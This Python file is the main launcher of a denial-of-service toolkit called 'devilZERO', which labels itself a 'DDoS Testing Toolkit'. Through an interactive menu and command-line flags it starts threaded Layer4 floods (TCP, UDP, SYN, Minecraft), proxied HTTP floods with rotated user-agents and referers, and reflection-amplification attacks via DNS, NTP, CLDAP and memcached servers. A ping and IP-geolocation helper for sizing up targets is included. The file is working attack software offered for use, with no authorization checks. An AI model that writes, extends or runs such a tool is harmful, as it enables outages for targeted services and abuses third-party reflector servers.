#!/usr/bin/env python3
import argparse
import sys
import threading
import time
from pathlib import Path

from .utils import (
    Colors, clear_screen, print_banner, confirm_action,
    safe_input, print_error, print_success, print_info, print_warning
)
from .core import REQUESTS_SENT, BYTES_SEND, Tools, Counter, __version__
from .layer4 import Layer4
from .layer7 import HttpFlood
from .amplification import amplification_attack
from .proxy import handle_proxy_list
from . import config

# Initialize counters
REQUESTS_SENT = Counter()
BYTES_SEND = Counter()

def run_layer4(host: str, port: int, method: str, threads: int, duration: int, use_proxy: bool = False, proxy_type: int = 0):
    """Run Layer4 attack."""
    import socket
    try:
        host_ip = socket.gethostbyname(host)
    except Exception as e:
        print_error(f"Cannot resolve host: {e}")
        return

    proxies = None
    if use_proxy:
        proxy_file = Path(__file__).parent / 'data' / f'proxies_{proxy_type}.txt'
        proxies = handle_proxy_list(config.config, proxy_file, proxy_type, url=None)
        if not proxies:
            print_warning("No proxies available, continuing without.")

    protocolid = config.MINECRAFT_DEFAULT_PROTOCOL
    if method in ['MINECRAFT', 'MCBOT']:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host_ip, port))
            from .core import Tools, Minecraft
            Tools.send(s, Minecraft.handshake((host_ip, port), protocolid, 1))
            Tools.send(s, Minecraft.data(b'\x00'))
            data = s.recv(1024)
            s.close()
            match = Tools.protocolRex.search(str(data))
            if match:
                protocolid = int(match.group(1))
                if protocolid < 47 or protocolid > 758:
                    protocolid = config.MINECRAFT_DEFAULT_PROTOCOL
        except:
            pass

    event = threading.Event()
    event.clear()
    for _ in range(threads):
        Layer4((host_ip, port), None, method, event, proxies, protocolid).start()

    print_success(f"Attack started on {host}:{port} with method {method} for {duration} seconds.")
    event.set()
    start_time = time.time()
    while time.time() < start_time + duration:
        print(f"\r{Colors.WARNING}PPS: {Tools.humanformat(int(REQUESTS_SENT))}  BPS: {Tools.humanbytes(int(BYTES_SEND))}{Colors.RESET}", end='')
        REQUESTS_SENT.set(0)
        BYTES_SEND.set(0)
        time.sleep(1)
    event.clear()
    print_success("Attack stopped.")

def run_layer7(target_url: str, method: str, threads: int, duration: int, rpc: int = 1, use_proxy: bool = False, proxy_type: int = 0):
    """Run Layer7 HTTP flood."""
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url
    try:
        from yarl import URL
        import socket
        url = URL(target_url)
        host = socket.gethostbyname(url.host)
    except Exception as e:
        print_error(f"Invalid URL: {e}")
        return

    # Load user-agents and referers from files
    useragent_file = Path(__file__).parent / 'data' / 'useragent.txt'
    referers_file = Path(__file__).parent / 'data' / 'referers.txt'
    useragents = set()
    referers = set()
    if useragent_file.exists():
        with open(useragent_file) as f:
            useragents = {line.strip() for line in f if line.strip()}
    if referers_file.exists():
        with open(referers_file) as f:
            referers = {line.strip() for line in f if line.strip()}
    if not useragents:
        useragents = {"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"}
    if not referers:
        referers = {"https://www.google.com/"}

    proxies = None
    if use_proxy:
        proxy_file = Path(__file__).parent / 'data' / f'proxies_{proxy_type}.txt'
        proxies = handle_proxy_list(config.config, proxy_file, proxy_type, target_url)
        if not proxies:
            print_warning("No proxies available, continuing without.")

    event = threading.Event()
    event.clear()
    for tid in range(threads):
        HttpFlood(tid, url, host, method, rpc, event, useragents, referers, proxies).start()

    print_success(f"Attack started on {target_url} with method {method} for {duration} seconds.")
    event.set()
    start_time = time.time()
    while time.time() < start_time + duration:
        print(f"\r{Colors.WARNING}Requests: {Tools.humanformat(int(REQUESTS_SENT))}  Bytes: {Tools.humanbytes(int(BYTES_SEND))}{Colors.RESET}", end='')
        REQUESTS_SENT.set(0)
        BYTES_SEND.set(0)
        time.sleep(1)
    event.clear()
    print_success("Attack stopped.")

def run_tools():
    """Interactive tools submenu."""
    while True:
        clear_screen()
        print_banner()
        print(f"\n{Colors.BOLD}{Colors.OKCYAN}Tools Menu:{Colors.RESET}")
        print("  1) Ping")
        print("  2) IP Info")
        print("  3) Back to main menu")
        choice = safe_input("Select [1-3]: ", default='3', type_func=str)
        if choice == '1':
            target = safe_input("IP or hostname: ", type_func=str)
            if target:
                print_info(f"Pinging {target}...")
                try:
                    from icmplib import ping
                    r = ping(target, count=5, interval=0.2)
                    print(f"Address: {r.address}")
                    print(f"Packets: {r.packets_received}/{r.packets_sent}")
                    print(f"Avg RTT: {r.avg_rtt} ms")
                    print(f"Status: {'ONLINE' if r.is_alive else 'OFFLINE'}")
                except Exception as e:
                    print_error(str(e))
                input("\nPress Enter to continue...")
        elif choice == '2':
            target = safe_input("IP or hostname: ", type_func=str)
            if target:
                print_info(f"Fetching info for {target}...")
                try:
                    import requests
                    resp = requests.get(f"https://ipwhois.app/json/{target}/", timeout=10)
                    data = resp.json()
                    print(f"Country: {data.get('country')}")
                    print(f"City: {data.get('city')}")
                    print(f"ISP: {data.get('isp')}")
                    print(f"Org: {data.get('org')}")
                except Exception as e:
                    print_error(str(e))
                input("\nPress Enter to continue...")
        elif choice == '3':
            break

def interactive_menu():
    """Main interactive menu."""
    while True:
        clear_screen()
        print_banner()
        print(f"\n{Colors.BOLD}{Colors.OKCYAN}Main Menu:{Colors.RESET}")
        print("  1) Layer4 Attacks (TCP/UDP/SYN/VSE/Minecraft/etc.)")
        print("  2) Layer7 Attacks (HTTP/HTTPS Flood)")
        print("  3) Amplification Attacks (DNS/NTP/RDP/CLDAP/etc.)")
        print("  4) Tools (Ping, IP Info)")
        print("  5) Exit")
        choice = safe_input("Select [1-5]: ", default='5', type_func=str)

        if choice == '1':
            host = safe_input("Target IP or domain: ", type_func=str)
            port = safe_input("Port (default 80): ", default=80, type_func=int)
            method = safe_input("Method (TCP/UDP/SYN/VSE/MINECRAFT/...): ", default='TCP', type_func=str).upper()
            threads = safe_input("Threads (default 100): ", default=100, type_func=int)
            duration = safe_input("Duration (seconds, default 60): ", default=60, type_func=int)
            use_proxy = confirm_action("Use proxies?")
            proxy_type = 0
            if use_proxy:
                proxy_type = safe_input("Proxy type (1=HTTP,4=SOCKS4,5=SOCKS5,6=RANDOM,0=ALL): ", default=0, type_func=int)
            run_layer4(host, port, method, threads, duration, use_proxy, proxy_type)
            input("\nPress Enter to continue...")

        elif choice == '2':
            target = safe_input("Target URL (e.g., http://example.com): ", type_func=str)
            method = safe_input("Method (GET/POST/CFB/...): ", default='GET', type_func=str).upper()
            threads = safe_input("Threads (default 100): ", default=100, type_func=int)
            duration = safe_input("Duration (seconds, default 60): ", default=60, type_func=int)
            rpc = safe_input("Requests per connection (RPC, default 1): ", default=1, type_func=int)
            use_proxy = confirm_action("Use proxies?")
            proxy_type = 0
            if use_proxy:
                proxy_type = safe_input("Proxy type (1=HTTP,4=SOCKS4,5=SOCKS5,6=RANDOM,0=ALL): ", default=0, type_func=int)
            run_layer7(target, method, threads, duration, rpc, use_proxy, proxy_type)
            input("\nPress Enter to continue...")

        elif choice == '3':
            host = safe_input("Target IP or domain: ", type_func=str)
            port = safe_input("Port (default 53): ", default=53, type_func=int)
            method = safe_input("Amplification method (DNS/NTP/RDP/CLDAP/MEM/CHAR/ARD): ", default='DNS', type_func=str).upper()
            threads = safe_input("Threads (default 100): ", default=100, type_func=int)
            duration = safe_input("Duration (seconds, default 60): ", default=60, type_func=int)
            ref_file = safe_input("Path to reflector file (list of IPs): ", type_func=str)
            if not Path(ref_file).exists():
                print_error(f"Reflector file not found: {ref_file}")
                input("Press Enter to continue...")
                continue
            amplification_attack(host, port, method, threads, duration, ref_file)
            input("\nPress Enter to continue...")

        elif choice == '4':
            run_tools()

        elif choice == '5':
            print_success("Goodbye! Stay legal.")
            sys.exit(0)

def main():
    parser = argparse.ArgumentParser(description='devilZERO - DDoS Testing Toolkit')
    parser.add_argument('--version', action='version', version=f'devilZERO {__version__}')
    parser.add_argument('--layer4', nargs=4, metavar=('HOST', 'PORT', 'METHOD', 'THREADS'), help='Run Layer4 attack')
    parser.add_argument('--layer7', nargs=3, metavar=('URL', 'METHOD', 'THREADS'), help='Run Layer7 attack')
    parser.add_argument('--amp', nargs=5, metavar=('HOST', 'PORT', 'METHOD', 'THREADS', 'REFLECTOR_FILE'), help='Run amplification attack')
    parser.add_argument('--ping', metavar='HOST', help='Ping a host')
    parser.add_argument('--info', metavar='IP', help='Get IP info')
    parser.add_argument('--duration', type=int, default=60, help='Attack duration (seconds)')
    parser.add_argument('--proxy', action='store_true', help='Use proxies')
    parser.add_argument('--proxy-type', type=int, default=0, help='Proxy type')
    args = parser.parse_args()

    # If no arguments, run interactive menu
    if len(sys.argv) == 1:
        interactive_menu()
        return

    # CLI mode
    if args.layer4:
        host, port, method, threads = args.layer4
        run_layer4(host, int(port), method.upper(), int(threads), args.duration, args.proxy, args.proxy_type)
    elif args.layer7:
        url, method, threads = args.layer7
        run_layer7(url, method.upper(), int(threads), args.duration, 1, args.proxy, args.proxy_type)
    elif args.amp:
        host, port, method, threads, refl = args.amp
        amplification_attack(host, int(port), method.upper(), int(threads), args.duration, refl)
    elif args.ping:
        try:
            from icmplib import ping
            r = ping(args.ping, count=5, interval=0.2)
            print(f"Address: {r.address}\nPackets: {r.packets_received}/{r.packets_sent}\nAvg RTT: {r.avg_rtt} ms\nStatus: {'ONLINE' if r.is_alive else 'OFFLINE'}")
        except Exception as e:
            print_error(str(e))
    elif args.info:
        try:
            import requests
            resp = requests.get(f"https://ipwhois.app/json/{args.info}/", timeout=10)
            data = resp.json()
            print(f"Country: {data.get('country')}\nCity: {data.get('city')}\nISP: {data.get('isp')}\nOrg: {data.get('org')}")
        except Exception as e:
            print_error(str(e))

if __name__ == '__main__':
    main()
